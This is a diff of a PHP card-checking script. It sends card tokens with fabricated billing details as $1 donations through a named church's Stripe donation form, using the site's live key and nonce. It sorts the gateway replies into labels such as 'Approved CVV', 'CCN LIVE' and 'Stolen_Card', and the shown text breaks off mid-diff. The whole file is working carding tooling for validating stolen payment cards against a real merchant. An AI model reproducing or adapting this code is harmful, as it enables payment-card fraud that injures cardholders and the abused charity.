@@ -82,12 +82,24 @@ $phone = $numero1.''.$numero2.''.$numero3;
 $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
 $serv_rnd = $serve_arr[array_rand($serve_arr)];
 $email= str_replace("example.com", $serv_rnd, $email);
-if($state=="Alabama"){ $state="AL";
+if($state=="alabama"){ $state="AL";
 }else if($state=="alaska"){ $state="AK";
+}else if($state=="maharashtra"){ $state="MH";
+}else if($state=="delhi"){ $state="DL";
+}else if($state=="west bengal"){ $state="WB";
+}else if($state=="karantaka"){ $state="KA";
+}else if($state=="ontario"){ $state="ON";
+}else if($state=="quebec"){ $state="QC";
+}else if($state=="nova scotia"){ $state="NS";
+}else if($state=="new brunswick"){ $state="NB";
+}else if($state=="manitoba"){ $state="MB";
+}else if($state=="andhra pradesh"){ $state="AP";
+}else if($state=="tamil nadu"){ $state="TN";
 }else if($state=="arizona"){ $state="AR";
 }else if($state=="california"){ $state="CA";
 }else if($state=="olorado"){ $state="CO";
 }else if($state=="connecticut"){ $state="CT";
+}else if($state=="izmir"){ $state="IZ";
 }else if($state=="delaware"){ $state="DE";
 }else if($state=="district of columbia"){ $state="DC";
 }else if($state=="florida"){ $state="FL";
@@ -230,12 +242,15 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
 'x-requested-with: XMLHttpRequest',
   ));
-curl_setopt($ch, CURLOPT_POSTFIELDS,'action=ds_process_button&stripeToken='.$token.'&paymentMethodID='.$id.'&allData%5BbillingDetails%5D%5Bname%5D='.$firstname.'+'.$lastname.'&allData%5BbillingDetails%5D%5Bemail%5D='.$email.'&allData%5BbillingDetails%5D%5Bphone%5D='.$phone.'&allData%5BbillingDetails%5D%5Baddress%5D%5Bline1%5D=224+South+Michigan+Avenue%2C+Street+104&allData%5BbillingDetails%5D%5Baddress%5D%5Bcity%5D='.$city.'&allData%5BbillingDetails%5D%5Baddress%5D%5Bstate%5D='.$state.'&allData%5BbillingDetails%5D%5Baddress%5D%5Bpostal_code%5D=60604&allData%5BbillingDetails%5D%5Baddress%5D%5Bcountry%5D=US&type=donation&amount=1&params%5Bvalue%5D=ds1585398497421&params%5Bname%5D=Toulouse+International+Church&params%5Bamount%5D=MTAwMA%3D%3D&params%5Boriginal_amount%5D=1&params%5Bdescription%5D=Support+TIC+through+online+giving.&params%5Bpanellabel%5D=Confirm+donation&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=&params%5Bcurrency%5D=USD&params%5Blocale%5D=auto&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=ds1585398497421&params%5Bcustom_role%5D=&params%5Bbilling%5D=1&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_Y7OlfrlgA97czcK8Ay1cMfBD00H6ts7jks&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Ftoulouseinternationalchurch.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Ftoulouseinternationalchurch.org%2Fwp-content%2Fuploads%2F2019%2F12%2Ftic-square-light-white.png&params%5Binstance%5D=ds1585398497421&params%5Bds_nonce%5D=348480f733&ds_nonce=348480f733');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'action=ds_process_button&stripeToken='.$token.'&paymentMethodID='.$id.'&allData%5BbillingDetails%5D%5Bname%5D='.$firstname.'+'.$lastname.'&allData%5BbillingDetails%5D%5Bemail%5D='.$email.'&allData%5BbillingDetails%5D%5Bphone%5D='.$phone.'&allData%5BbillingDetails%5D%5Baddress%5D%5Bline1%5D=224+South+Michigan+Avenue%2C+Street+104&allData%5BbillingDetails%5D%5Baddress%5D%5Bcity%5D='.$city.'&allData%5BbillingDetails%5D%5Baddress%5D%5Bstate%5D='.$state.'&allData%5BbillingDetails%5D%5Baddress%5D%5Bpostal_code%5D=60604&allData%5BbillingDetails%5D%5Baddress%5D%5Bcountry%5D=US&type=donation&amount=1&params%5Bvalue%5D=ds1585398497421&params%5Bname%5D=Toulouse+International+Church&params%5Bamount%5D=MTAwMA%3D%3D&params%5Boriginal_amount%5D=1&params%5Bdescription%5D=Support+TIC+through+online+giving.&params%5Bpanellabel%5D=Confirm+donation&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=&params%5Bcurrency%5D=USD&params%5Blocale%5D=auto&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=ds1585398497421&params%5Bcustom_role%5D=&params%5Bbilling%5D=1&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_Y7OlfrlgA97czcK8Ay1cMfBD00H6ts7jks&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Ftoulouseinternationalchurch.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Ftoulouseinternationalchurch.org%2Fwp-content%2Fuploads%2F2019%2F12%2Ftic-square-light-white.png&params%5Binstance%5D=ds1585398497421&params%5Bds_nonce%5D=c7581d8585&ds_nonce=c7581d8585');
 
 $result3 = curl_exec($ch);
 $message = trim(strip_tags(getstr($result3,'"message":"','"')));
 
+
 # ---------------------------------------#
+
+
 
 $cctwo = substr("$cc", 0, 6);
 
@@ -252,333 +267,703 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, '');
 $fim = curl_exec($ch);
 $fim = json_decode($fim,true);
-$bank = $fim['bank']['name'];
-$country = $fim['country']['alpha2'];
-$type = $fim['type'];
-$brand = $fim['brand']
-$scheme = $fim['scheme']
-$bankcity = $fim['bank']['city']
-    
+$bank = strtoupper($fim['bank']['name']);
+$scheme1 = strtoupper($fim['scheme']);
+$country = strtoupper($fim['country']['alpha2']);
+$emoji = strtoupper($fim['country']['emoji']);
+$type = strtoupper($fim['type']);
+$brand = strtoupper($fim['brand']);
+$currency = strtoupper($fim['country']['currency']);
+
+
+
+
 # ---------------- [Responses] ----------------- #
 
 if
 (strpos($result3,  '"message":"Thank you for your support!"')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "Thank You For Donation.")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br>";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 elseif
 (strpos($result3,  '"Thank You For Donation."')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "Thank You.")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> ";
+  
 }
 
 elseif
 (strpos($result3,  'Your card zip code is incorrect.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
+  
 } 
 elseif
 (strpos($result3,  '/donations/thank_you?donation_number=','')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 
 elseif
 (strpos($result3,  "incorrect_zip")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 
 elseif
 (strpos($result3,  '"type":"one-time"')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'security code is incorrect.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
-elseif
-(strpos($result3,  'security code is invalid.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
-}
 
 elseif
 (strpos($result3,  'Your card&#039;s security code is incorrect.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "incorrect_cvc")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "stolen_card")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "lost_card")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'Your card has insufficient funds.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "pickup_card")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "insufficient_funds")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  '"cvc_check": "fail"')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'security code is invalid.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'Your card&#039;s security code is incorrect.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "incorrect_cvc")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "stolen_card")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "lost_card")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'Your card has insufficient funds.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "pickup_card")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "insufficient_funds")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
-
+elseif
+(strpos($result3,  "Oops, the payment didn't go through.")) {
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Oops, the payment didn't go through ❌ SOHAM  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
+}
 elseif
 (strpos($result3,  'Your card has expired.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
